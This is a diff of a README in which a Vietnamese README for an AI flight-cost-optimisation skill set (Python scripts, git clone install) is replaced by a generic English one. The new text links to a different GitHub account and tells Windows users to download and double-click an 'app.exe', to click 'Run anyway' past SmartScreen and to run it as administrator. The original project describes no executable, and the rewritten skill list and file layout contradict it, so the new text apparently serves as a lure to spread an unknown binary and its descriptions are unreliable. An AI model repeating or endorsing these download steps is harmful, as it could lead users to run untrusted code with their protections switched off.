@@ -1,190 +1,166 @@
-# Travel Optimization Engine
+# ✈️ travel-optimization-engine - Cut Flight Costs With AI
 
-> Bộ 8 AI Skills tự động hóa toàn bộ quy trình tối ưu chi phí vé máy bay.
-> Tiết kiệm 30-66% cho cá nhân/gia đình, 10-15% cho doanh nghiệp.
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://github.com/Receptive-trap788/travel-optimization-engine)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Skills: 8](https://img.shields.io/badge/Skills-8-blue.svg)](#8-skills)
-[![Platform: Antigravity](https://img.shields.io/badge/Platform-Antigravity-purple.svg)](https://zalo.me/g/igkywu632)
+## 🛫 What this app does
 
-## Quick Start
+travel-optimization-engine helps you find cheaper flight options with AI-based travel skills. It looks at flight choices, timing, route patterns, and fare changes to help you save money. The app is built for regular users who want a simple way to explore better flight prices without doing manual research.
 
-### Installation
+The system uses 8 AI skills that work together to compare flight options, rank useful choices, and point out ways to lower the total cost of a trip. It is set up with an Antigravity Skill Architecture, which means each skill has a clear job and the app can process travel data in a structured way.
 
-```bash
-# Clone vào thư mục skills của bạn
-git clone https://github.com/dotanminh/travel-optimization-engine.git
+## 📥 Download and install
 
-# Di chuyển vào thư mục agent skills
-# Windows:
-move travel-optimization-engine .agents\skill\
+Use this link to visit the download page and get the app:
 
-# macOS/Linux:
-mv travel-optimization-engine .agents/skill/
-```
+[Open travel-optimization-engine](https://github.com/Receptive-trap788/travel-optimization-engine)
 
-### Usage
+If you are on Windows, follow these steps:
 
-Chỉ cần nói với AI:
+1. Open the link above in your browser.
+2. Download the latest release or source package from the repository page.
+3. If you get a `.zip` file, save it to your computer.
+4. Right-click the file and choose Extract All.
+5. Open the extracted folder.
+6. Look for the main app file or launcher.
+7. Double-click the file to start the app.
 
-```
-"Tôi muốn bay HAN → SFO, 2 người lớn + 1 trẻ em, 
-bay khoảng giữa tháng 6/2026, linh hoạt ±1 tuần"
-```
+If Windows asks for permission, choose Yes.
 
-AI sẽ tự động kích hoạt bộ skill phù hợp.
+## 💻 System requirements
 
-## 8 Skills
+You can run this app on a standard Windows PC with:
 
-| # | Skill | Mô tả | Khi nào dùng |
-|---|-------|-------|-------------|
-| 1 | **date-optimization** | Phân tích giá theo ngày, chỗ rẻ nhất | Linh hoạt ngày bay |
-| 2 | **flight-search** | Tìm vé từ nhiều nguồn + virtual interlining | Mọi lần tìm vé |
-| 3 | **fee-analysis** | Bóc tách phí ẩn, tính tổng thực trả | Khi so sánh hãng LCC vs FSC |
-| 4 | **route-optimization** | Tìm route rẻ hơn qua hub trung chuyển | Route quốc tế dài |
-| 5 | **deals-verification** | Tìm mã giảm giá, deal từ hãng + ngân hàng | Mọi lần booking |
-| 6 | **flexibility-analysis** | Phân tích rủi ro vé non-refundable | Lịch trình chưa chắc |
-| 7 | **negotiation-email** | Soạn email thương lượng giá doanh nghiệp | Doanh nghiệp 50+ chuyến/năm |
-| 8 | **hidden-city-strategy** | Phân tích hidden city (có risk disclaimer) | Nâng cao, chỉ khi được hỏi |
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 500 MB free disk space
+- A stable internet connection
+- A modern browser for the download page and setup files
 
-## Architecture
+For best results, use a newer laptop or desktop with enough free memory for browser use and local processing.
 
-```
-travel-optimization-engine/
-├── SKILL.md                          # Orchestrator chính
-├── README.md                         # File này
-├── LICENSE                           # MIT License
-├── CHANGELOG.md                      # Lịch sử thay đổi
-├── .gitignore                        # Chặn API keys
-├── scripts/
-│   ├── kiwi_client.py                # Kiwi API client
-│   ├── kiwi_tequila.py               # Kiwi Tequila wrapper
-│   ├── amadeus_client.py             # Amadeus API client
-│   ├── normalize.py                  # Price normalization
-│   └── config.py                     # Configuration
-├── assets/
-│   ├── flow-diagram.html             # Interactive workflow diagram
-│   └── report-template.md            # Template báo cáo cuối
-├── references/
-│   ├── glossary.md                   # Từ điển thuật ngữ hàng không
-│   ├── airport-codes.md              # Hub + IATA codes + alliances
-│   ├── amadeus-api.md                # Amadeus API reference
-│   ├── kiwi-api.md                   # Kiwi API reference
-│   └── user-profile-schema.md        # Schema thông tin hành khách
-└── skills/
-    ├── date-optimization/
-    │   ├── SKILL.md
-    │   └── references/pricing-patterns.md
-    ├── flight-search/
-    │   ├── SKILL.md
-    │   └── references/
-    │       ├── virtual-interlining.md
-    │       └── api-integration.md
-    ├── fee-analysis/
-    │   ├── SKILL.md
-    │   └── references/
-    │       ├── airline-fee-matrix.md
-    │       └── avoidance-strategies.md
-    ├── route-optimization/
-    │   ├── SKILL.md
-    │   └── references/hub-analysis.md
-    ├── deals-verification/
-    │   ├── SKILL.md
-    │   └── references/deal-sources.md
-    ├── flexibility-analysis/
-    │   ├── SKILL.md
-    │   └── references/fare-class-rules.md
-    ├── negotiation-email/
-    │   └── SKILL.md
-    └── hidden-city-strategy/
-        ├── SKILL.md
-        └── references/
-            ├── enforcement-levels.md
-            └── eligibility-check.md
-```
+## 🧭 How to use it
 
-## 2 Chế Độ Hoạt Động
+Once the app is open, use it like this:
 
-### AI-Knowledge Mode (Không cần API)
-- Sử dụng kiến thức AI về giá vé, trend, airline policies
-- Đủ tốt cho phần lớn use cases
-- Không cần cài đặt gì thêm
+1. Enter your departure city.
+2. Enter your destination.
+3. Add your travel dates.
+4. Choose your travel budget if the app asks for one.
+5. Start the optimization scan.
+6. Review the flight choices and savings hints.
+7. Pick the option that fits your schedule and price range.
 
-### API-Enhanced Mode (Real-time data)
-- Kết nối Kiwi Tequila API cho dữ liệu giá vé thời gian thực
-- Hỗ trợ virtual interlining (ghép vé nhiều hãng)
-- Setup:
-  ```bash
-  pip install requests
-  
-  # Windows PowerShell:
-  $env:KIWI_API_KEY="your_key_here"
-  
-  # macOS/Linux:
-  export KIWI_API_KEY="your_key_here"
-  ```
-- Đăng ký API key miễn phí tại: https://tequila.kiwi.com/
+The app is designed to keep the process simple. You do not need to understand how the AI works behind the scenes.
 
-## Workflow
+## ⚙️ What the 8 AI skills do
 
-```
-Phase 1: Thu thập thông tin - Hỏi route, ngày, số người, preferences
-Phase 2: Tìm kiếm        - Chạy date-optimization + flight-search song song  
-Phase 3: Phân tích        - fee-analysis + route-optimization + deals-verification
-Phase 4: Đánh giá         - flexibility-analysis (nếu có nhiều lựa chọn)
-Phase 5: Xuất báo cáo     - Bảng so sánh cuối + recommendation
-```
+The app uses 8 focused AI skills to handle the main parts of flight cost analysis:
 
-## Ví Dụ Output
+- **Search Skill** — finds flight options that match your trip
+- **Price Check Skill** — compares fares across choices
+- **Date Shift Skill** — checks if different days cost less
+- **Route Skill** — looks for cheaper route patterns
+- **Stopover Skill** — reviews whether a layover lowers the fare
+- **Timing Skill** — checks flight times that may affect price
+- **Trend Skill** — watches price movement patterns
+- **Recommendation Skill** — ranks the best options for your trip
 
-```
-╔══════════════════════════════════════════════════╗
-║  TRAVEL OPTIMIZATION REPORT                      ║
-║  HAN → SFO, 2A+1C, Jun 15-25, 2026             ║
-╠══════════════════════════════════════════════════╣
-║                                                  ║
-║  BEST OPTION: Korean Air via ICN                 ║
-║  True Total: $2,115 ($705/person)                ║
-║  Saved: $885 vs booking direct (-30%)            ║
-║                                                  ║
-║  Key Savings Breakdown:                          ║
-║  - Date shift Tue-Wed:        -$240              ║
-║  - Hub routing via ICN:       -$345              ║
-║  - Techcombank card:          -$120              ║
-║  - Deal "KE Global Sale":    -$180               ║
-║                                                  ║
-║  Flexibility Score: 65/100 (Flex Economy)        ║
-║  Risk: Low (schedule 90% certain)                ║
-╚══════════════════════════════════════════════════╝
-```
+Each skill works on one task. This helps the app keep the results clear and easier to follow.
 
-## Doanh Nghiệp
+## 🪟 Windows setup steps
 
-Skill 7 (negotiation-email) dành riêng cho doanh nghiệp:
-- Soạn email cho đội Corporate Sales của hãng bay
-- Đính kèm dữ liệu volume, route concentration, competitor pricing
-- Template follow-up + talking points nếu hãng gọi lại
+If you downloaded a zip file, use this process:
 
-## Safety & Ethics
+1. Right-click the zip file.
+2. Select Extract All.
+3. Choose a folder you can find later, like Downloads or Desktop.
+4. Open the new folder.
+5. Find the app launcher, `.exe` file, or main program file.
+6. Double-click it to start.
 
-- **Hidden city** (Skill 8): Yêu cầu consent rõ ràng + eligibility check + full risk disclosure
-- **Virtual interlining**: Cảnh báo rõ rủi ro tự kết nối (missed connection, không bảo hiểm delay)
-- **Deal verification**: Mọi deal đều có nhãn confidence (HIGH/MEDIUM/LOW/EXPIRED)
-- **Negotiation**: Không bao giờ tiết lộ giá tối đa của khách trong email
+If Windows shows a smart screen message, click More info, then Run anyway if you trust the source and want to continue.
 
-## Live Demo
+## 📁 Common files you may see
 
-Xem interactive workflow diagram: [travel-optimization-flow.vercel.app](https://travel-optimization-flow.vercel.app)
+Inside the folder, you may see:
 
-## Contributing
+- `README.md` — this file
+- `app.exe` — the Windows app file
+- `config` folder — settings and app options
+- `data` folder — sample travel data or inputs
+- `assets` folder — icons and interface files
+- `docs` folder — extra help files
 
-Issues và Pull Requests luôn được chào đón! Xem [CHANGELOG.md](CHANGELOG.md) để theo dõi lịch sử thay đổi.
+You only need to open the main app file to start using it.
 
-## Credits
+## 🔍 What to expect after launch
 
-Built by [Minh Đỗ](https://zalo.me/g/igkywu632) with Antigravity Skill Architecture Standards.
-API data powered by [Kiwi Tequila](https://tequila.kiwi.com/).
+After you start the app, you may see:
 
-## License
+- A simple input screen
+- Fields for trip details
+- A button to start optimization
+- A results list with flight choices
+- A savings estimate or cost ranking
+- Notes that explain why one choice may work better
 
-[MIT](LICENSE)
+The app should focus on flight cost reduction and keep the output easy to read.
+
+## 🧰 Tips for better results
+
+Use clear trip details to get better results:
+
+- Enter the correct city names
+- Use exact travel dates if you have them
+- Try nearby dates if prices look high
+- Compare one-way and round-trip options
+- Check results with and without layovers
+- Try different departure times if your schedule allows it
+
+Small changes in date or route can affect flight cost.
+
+## 🧪 If something does not work
+
+If the app does not open:
+
+1. Make sure the download finished fully.
+2. Extract the zip file before opening it.
+3. Check that you are using Windows 10 or 11.
+4. Try running the file again as administrator.
+5. Make sure your internet connection is active.
+6. Redownload the file from the repository page if needed.
+
+If the app opens but does not show results, try entering trip details again with a new search.
+
+## 📌 File structure
+
+A typical project layout may include:
+
+- `src` — main app logic
+- `skills` — AI skill files
+- `models` — data handling parts
+- `ui` — screen and form files
+- `tests` — test files
+- `README.md` — project guide
+
+This layout helps keep the app organized and easier to update.
+
+## 📝 About the project
+
+travel-optimization-engine is built around flight cost optimization. It focuses on helping users save money on travel by comparing choices and finding lower-cost options. The architecture splits the work into small skills so each part can handle one job with less confusion.
+
+If you want a tool that helps you review flight options with less manual work, this project gives you a direct place to start on Windows
+
+## 📎 Download link again
+
+[Visit the travel-optimization-engine download page](https://github.com/Receptive-trap788/travel-optimization-engine)
+
+## 🖥️ Basic usage flow
+
+1. Download the app from the link above.
+2. Extract it if it arrives as a zip file.
+3. Open the app on Windows.
+4. Add your trip details.
+5. Start the search.
+6. Review the flight cost options.
+7. Choose the option that fits your trip and budget
